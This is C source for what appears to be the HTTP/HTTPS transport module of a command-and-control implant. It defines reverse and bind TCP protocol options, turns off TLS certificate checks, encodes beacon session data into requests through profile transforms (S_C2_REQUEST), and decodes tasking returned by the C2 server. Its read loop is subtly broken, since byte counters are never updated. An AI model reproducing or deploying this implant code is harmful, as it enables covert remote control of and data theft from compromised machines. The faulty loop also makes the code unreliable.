#include "pch.h"

#include "network.h"

#include "metadata.h"
#include "settings.h"
#include "transform.h"

BOOL gNetworkIsInit = FALSE;

void NetworkInit(void)
{
	if (gNetworkIsInit)
		return;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		WSACleanup();
		exit(1);
	}

	// FIXME: DNS Settings here...

	gNetworkIsInit = TRUE;
}

ULONG NetworkGetActiveAdapterIPv4()
{
	SOCKET sock = WSASocketA(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0);
	if (sock == INVALID_SOCKET)
	{
		return 0;
	}

	DWORD bytesReturned;
	int numInterfaces = 0;
	INTERFACE_INFO interfaceInfo[20];
	if (!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo), &bytesReturned, NULL, NULL))
	{
		numInterfaces = bytesReturned / sizeof(INTERFACE_INFO);
	}

	for (int i = 0; i < numInterfaces; i++)
	{
		if (!(interfaceInfo[i].iiFlags & IFF_LOOPBACK) && interfaceInfo[i].iiFlags & IFF_UP)
		{
			closesocket(sock);
			return interfaceInfo[i].iiAddress.AddressIn.sin_addr.s_addr;
		}
	}

	closesocket(sock);
	return 0;
}

#define PROTOCOL_HTTP 0
#define PROTOCOL_DNS 1
#define PROTOCOL_SMB 2
#define PROTOCOL_TCP_REVERSE 4
#define PROTOCOL_HTTPS 8
#define PROTOCOL_TCP_BIND 16

INTERNET_STATUS_CALLBACK gNetworkStatusCallback;
void NetworkUpdateSettings(HINTERNET hInternet)
{
	if(S_PROTOCOL & PROTOCOL_HTTPS)
	{
		int buffer;
		int length = sizeof(buffer);
		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, &length);
		buffer |= (SECURITY_FLAG_IGNORE_REVOCATION |
			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_WRONG_USAGE |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID);
		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer));
	}

	if (S_HEADERS_REMOVE)
	{
		InternetSetStatusCallback(hInternet, gNetworkStatusCallback);
	}
}

BOOL NetworkCheckResponse(HINTERNET hInternet)
{
	char status[256];
	DWORD statusCodeLength = sizeof(status);
	if (!HttpQueryInfoA(hInternet, HTTP_QUERY_STATUS_CODE, status, &statusCodeLength, NULL))
		return FALSE;

	return atoi(status) == HTTP_STATUS_OK;
}

HINTERNET gInternetConnect;
DWORD gNetworkOptions;
DWORD gContext;

int NetworkGetInternal(const char* uri, SESSION* session, char* data, const int maxGet)
{
#define MAX_URI 0x400
#define MAX_READ 0x1000
	TRANSFORM transform;
	memset(&transform, 0, sizeof(transform));

	CHAR finalUri[MAX_URI];
	memset(finalUri, 0, sizeof(finalUri));

	TransformInit(&transform, maxGet);
	snprintf(transform.uri, MAX_URI, "%s", uri);

	TransformEncode(&transform, S_C2_REQUEST, session->data, session->length, NULL, 0);

	if(strlen(transform.uriParams))
		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
	else
		snprintf(finalUri, sizeof(finalUri), "%s", transform.uri);

	HINTERNET hInternet = HttpOpenRequestA(
		gInternetConnect, 
		"GET", 
		finalUri, 
		NULL, 
		NULL, 
		NULL, 
		gNetworkOptions, 
		&gContext);

	NetworkUpdateSettings(hInternet);

	HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength);
	TransformDestroy(&transform);

	if(!NetworkCheckResponse(hInternet))
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	DWORD bytesAvailable = 0;
	if(!InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0))
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	if (bytesAvailable >= maxGet)
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	if(bytesAvailable == 0)
	{
		InternetCloseHandle(hInternet);
		return 0;
	}

	if(maxGet == 0)
	{
		InternetCloseHandle(hInternet);
		return -1;
	}

	int totalBytesRead = 0;
	int bytesRead = 0;
	do
	{
		if(!InternetReadFile(hInternet, data + totalBytesRead, MAX_READ, &bytesAvailable) || bytesRead == 0)
		{
			InternetCloseHandle(hInternet);
			return TransformDecode(S_C2_RECOVER, data, totalBytesRead, maxGet);
		}
	} while (totalBytesRead < maxGet);

	InternetCloseHandle(hInternet);
	return -1;
}